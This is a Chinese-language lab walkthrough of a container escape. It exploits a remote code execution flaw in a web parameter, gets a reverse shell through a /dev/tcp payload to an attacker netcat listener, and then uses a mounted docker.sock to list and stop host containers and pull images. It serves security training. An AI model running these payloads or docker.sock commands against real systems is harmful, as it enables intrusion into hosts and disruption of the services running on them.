一、概述

在这个例子中，容器中的应用存在远程代码执行漏洞。攻击者利用该漏洞获得反弹shell，之后通过通过容器挂载的docker.sock获得访问宿主机的权限。
容器所在宿主机：debian 16，192.168.242.135
攻击者机器：kali linux 2021，192.168.242.1

实验环境下载：https://sourceforge.net/projects/defcon-26-container-security/


二、过程

1、 通过容器中的应用得到反弹shell

//访问容器中的应用
http://192.168.242.135/


此应用的q参数在GET方法中存在远程代码执行攻击漏洞，攻击者可通过此漏洞获得容器的反弹shell：
//攻击者监听本地端口
nc -lvp 5555  

//攻击者通过浏览器提交payload：
http://192.168.242.135/?q=require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.242.1/5555 0>%261"')


在终端窗口中得到反弹shell：


已经进入了容器。
 

2、 通过容器挂载的docker.sock访问宿主机

ls -l /var/run/docker.sock  //在容器中查看文件信息


docker守护进程通过/var/run/docker.sock文件来监听客户端发起的连接。这个文件应出现在宿主机中，容器内是不应该出现的。如果出现了，则说明容器启动的时候指定将该文件以数据卷的形式映射到了容器中。如果容器中存在docker客户端程序，则可以通过访问/var/run/docker.sock文件与宿主机的docker守护进程交互。
 
apt search docker  //在容器内在线搜索docker


可以在容器中在线安装docker客户端，也可以将docker的二进制程序直接复制到容器中运行。例如将二进制程序传送到容器中的/root/docker目录中。


./docker -H unix:///var/run/docker.sock ps


ps命令可以看到宿主机中运行的docker容器。
 

3、 针对宿主机和其它容器的攻击

./docker -H unix:///var/run/docker.sock stop sysmon  //停止宿主机中指定的容器


./docker -H unix:///var/run/docker.sock pull ubuntu  //拉取镜像


./docker -H unix:///var/run/docker.sock images  //查看镜像


镜像下载成功。之后攻击者可以通过启动自己的镜像发起更多的攻击。
